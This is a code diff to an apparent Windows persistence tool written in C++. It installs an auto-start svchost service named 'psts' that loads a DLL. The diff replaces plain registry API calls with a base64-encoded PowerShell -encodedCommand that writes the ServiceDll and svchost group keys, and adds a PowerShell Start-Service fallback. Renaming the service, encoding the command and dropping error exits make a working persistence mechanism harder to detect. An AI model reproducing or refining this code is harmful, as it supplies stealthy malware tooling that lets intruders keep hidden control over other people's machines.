@@ -110,13 +110,13 @@ int CreatePersistService() {
 	// create the service
 	hService = CreateServiceW(
 		hSCManager,
-		L"Persistence",
+		L"psts",
 		L"Persistence",
 		SERVICE_ALL_ACCESS,
 		SERVICE_WIN32_SHARE_PROCESS,
 		SERVICE_AUTO_START,
 		SERVICE_ERROR_NORMAL,
-		L"C:\\Windows\\System32\\svchost.exe -k WinSysPersist",
+		L"C:\\Windows\\System32\\svchost.exe -k WinSysPsts",
 		NULL,
 		NULL,
 		NULL,
@@ -128,71 +128,16 @@ int CreatePersistService() {
 		Log("[!] Failed to create service: " + std::to_string(GetLastError()), componentName);
 		return 2;
 	}
-	
-	// configure the service dll path
-	HKEY hKey;
-	LSTATUS s = RegCreateKeyExW(
-		HKLM,
-		L"SYSTEM\\CurrentControlSet\\services\\Persistence\\Parameters",
-		0,
-		NULL,
-		REG_OPTION_NON_VOLATILE,
-		KEY_WRITE,
-		NULL,
-		&hKey,
-		NULL
-	);
 
-	if (s != ERROR_SUCCESS) {
-		Log("[!] RegCreateKeyExW dllpath failed: " + std::to_string(GetLastError()), componentName);
-		return 3;
-	}
+	// configure service
 
-	s = RegSetKeyValueW(
-		hKey,
-		NULL,
-		L"ServiceDll",
-		REG_EXPAND_SZ,
-		dllPath,
-		sizeof(LPCSTR)+1
-	);
+	// powershell.exe -Command
+	// New-Item -Path 'HKLM:\SYSTEM\CurrentControlSet\services\psts\' -Name 'Parameters' -Force -ErrorAction Continue;
+	// Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\services\psts\Parameters\' -Name 'ServiceDll' -Value 'C:\Windows\System32\Persistence\persistence.dll' -Type ExpandString -Force -ErrorAction Continue;
+	// Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost\' -Name 'WinSysPsts' -Value 'psts' -Type MultiString -Force -ErrorAction Continue;
+	std::string cmdline = "powershell.exe -encodedCommand TgBlAHcALQBJAHQAZQBtACAALQBQAGEAdABoACAAJwBIAEsATABNADoAXABTAFkAUwBUAEUATQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAHMAZQByAHYAaQBjAGUAcwBcAHAAcwB0AHMAXAAnACAALQBOAGEAbQBlACAAJwBQAGEAcgBhAG0AZQB0AGUAcgBzACcAIAAtAEYAbwByAGMAZQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAQwBvAG4AdABpAG4AdQBlADsAIABTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJwBIAEsATABNADoAXABTAFkAUwBUAEUATQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAHMAZQByAHYAaQBjAGUAcwBcAHAAcwB0AHMAXABQAGEAcgBhAG0AZQB0AGUAcgBzAFwAJwAgAC0ATgBhAG0AZQAgACcAUwBlAHIAdgBpAGMAZQBEAGwAbAAnACAALQBWAGEAbAB1AGUAIAAnAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABTAHkAcwB0AGUAbQAzADIAXABQAGUAcgBzAGkAcwB0AGUAbgBjAGUAXABwAGUAcgBzAGkAcwB0AGUAbgBjAGUALgBkAGwAbAAnACAALQBUAHkAcABlACAARQB4AHAAYQBuAGQAUwB0AHIAaQBuAGcAIAAtAEYAbwByAGMAZQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAQwBvAG4AdABpAG4AdQBlADsAIABTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJwBIAEsATABNADoAXABTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABOAFQAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABTAHYAYwBoAG8AcwB0AFwAJwAgAC0ATgBhAG0AZQAgACcAVwBpAG4AUwB5AHMAUABzAHQAcwAnACAALQBWAGEAbAB1AGUAIAAnAHAAcwB0AHMAJwAgAC0AVAB5AHAAZQAgAE0AdQBsAHQAaQBTAHQAcgBpAG4AZwAgAC0ARgBvAHIAYwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABDAG8AbgB0AGkAbgB1AGUAOwA=";
 
-	if (s != ERROR_SUCCESS) {
-		Log("[!] RegSetKeyValueW dllpath failed: " + std::to_string(GetLastError()), componentName);
-		return 4;
-	}
-
-	// set service group
-	s = RegCreateKeyExW(
-		HKLM,
-		L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost",
-		0,
-		NULL,
-		REG_OPTION_NON_VOLATILE,
-		KEY_WRITE,
-		NULL,
-		&hKey,
-		NULL
-	);
-
-	if (s != ERROR_SUCCESS) {
-		Log("[!] RegCreateKeyExW group failed: " + std::to_string(GetLastError()), componentName);
-		return 5;
-	}
-
-	s = RegSetKeyValue(
-		hKey,
-		NULL,
-		L"",
-		REG_MULTI_SZ,
-		L"Persistence\0",
-		sizeof(LPCSTR) + 1
-	);
-
-	if (s != ERROR_SUCCESS) {
-		Log("[!] RegSetKeyValueW dllpath failed: " + std::to_string(GetLastError()), componentName);
-		return 6;
-	}
+	CreateProc("ConfigureService", cmdline);
 
 	return 0;
 }
@@ -223,7 +168,6 @@ int BeginService() {
 
 	if (hService == NULL) {
 		Log("[!] Failed to get handle to service: " + std::to_string(GetLastError()), componentName);
-		return 2;
 	}
 
 	// check if service is running?
@@ -234,8 +178,9 @@ int BeginService() {
 		NULL
 	)) {
 		Log("[!] Failed to start service: " + std::to_string(GetLastError()), componentName);
-		return 3;
 	}
+
+	CreateProc("StartService", "powershell.exe -Command Start-Service -Name 'psts'");
 
 	return 0;
 }
